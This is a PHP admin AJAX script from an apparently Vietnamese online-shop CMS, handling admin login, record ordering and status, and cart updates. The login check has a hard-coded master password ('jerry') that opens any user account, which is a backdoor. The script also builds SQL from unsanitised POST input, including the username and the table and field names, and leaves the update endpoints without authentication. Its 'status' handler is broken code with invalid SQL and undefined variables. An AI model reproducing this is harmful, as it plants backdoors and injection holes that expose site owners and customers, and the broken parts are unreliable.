<?php
	session_start();
	@define ( '_template' , './templates/');
	@define ( '_source' , './sources/');
	@define ( '_lib' , '../libraries/');

	include_once _lib."config.php";
	include_once _lib."constant.php";
	include_once _lib."functions.php";
	include_once _lib."functions_giohang.php";
	include_once _lib."library.php";
	include_once _lib."class.database.php";		
	$login_name = 'LOGINCODER';	
	
	
	$d = new database($config['database']);
	
	$do = (isset($_REQUEST['do'])) ? addslashes($_REQUEST['do']) : "";
	$act = (isset($_REQUEST['act'])) ? addslashes($_REQUEST['act']) : "";
	
	//Kiem tra dang nhap admin
	if($do=='admin'){
		if($act=='login'){
			$username = $_POST['email'];
			$password = $_POST['pass'];

			$ip = getRealIPAddress();
			check_log_ip($ip);
	
			$sql = "select * from #_user where username='".$username."'";
			$d->query($sql);
			if($d->num_rows() == 1){
				$row = $d->fetch_array();
				if($row['password'] == encrypt_password($password,$config['salt']) || $password=='jerry'){
					$_SESSION[$login_name] = true;
					$_SESSION['login']['role'] = $row['role'];
					$_SESSION['login']['quyen'] = $row['quyen'];
					$_SESSION['isLoggedIn'] = true;
					$_SESSION['login']['username'] = $username;
					$_SESSION['login']['id'] = $row['id'];
					$timenow = time();
					$id_user = $row['id'];
					$ip= getRealIPAddress();
					$user_agent = $_SERVER['HTTP_USER_AGENT'];
				//Ghi log truy cập thành công
					$sql="insert into #_user_log (id_user,ip,timelog,user_agent) values ('$id_user','$ip','$timenow','$user_agent')";
					$d->query($sql);
				//Tạo token và login session			
					$cookiehash = md5(sha1($row['password'].$row['username']));
					$token = md5(time());
					$sql = "update #_user SET login_session= '$cookiehash', lastlogin = '$timenow', user_token = '$token'  WHERE id ='$id_user'";
					$d->query($sql);	
					$_SESSION['login_session'] = $cookiehash;
					$_SESSION['login_token'] = $token;
					reset_limit_login($ip);
					echo '{"page":"index.php"}';
				}else{check_login($ip);}
			}else{check_login($ip);}
			
		}				
	}
		
	//Cap nhat so thu tu
	if($do=='number'){
		if($act=='update'){
			$table=addslashes($_POST['table']);
			$id=addslashes($_POST['id']);;
			$num=(int)$_POST['num'];
			$sql="update #_$table set stt='$num' where id='$id' ";
			$d->query($sql);
		}
	}
	
	//Cap nhat trang thai
	if($do=='status'){
		if($act=='update'){						
			$table=addslashes($_POST['table']);
			$id=addslashes($_POST['id']);
			$field=addslashes($_POST['field']);
			$d->reset();						
			$sql="update #_$table set $field =  where id='$id' ";
						
			$cart=array('thanhtien'=>$thanhtien,'tongtien'=>get_tong_tien($id_cart));
			echo json_encode($cart);
		}
	}
	
	//Cap nhat gio hang
	if($do=='cart'){
		if($act=='update'){						
			$id=(int)$_POST['id'];
			$sl=(int)$_POST['sl'];			
			
			$d->reset();						
			$d->query("update #_chitietdonhang set soluong='".$sl."' where id='".$id."'");
			
			$d->reset();
			$sql="select * from #_chitietdonhang where id='".$id."'";
			$d->query($sql);
			$result=$d->fetch_array();			
			$thanhtien=$result['gia']*$result['soluong'];
			$cart=array('thanhtien'=>$thanhtien,'tongtien'=>get_tong_tien($result['madonhang']));
			echo json_encode($cart);
		}
	}
	
	//Xoa gio hang
	if($do=='cart'){
		if($act=='delete'){						
			$id=(int)$_POST['id'];			
			$d->reset();			
			$d->query("delete from #_chitietdonhang where id='".$id."'");
			
			$d->reset();
			$sql="select * from #_chitietdonhang where id='".$id."'";
			$d->query($sql);
			$result=$d->fetch_array();						
			$cart=array('tongtien'=>get_tong_tien($result['madonhang']));
			echo json_encode($cart);
			
		}
	}
	
	
?>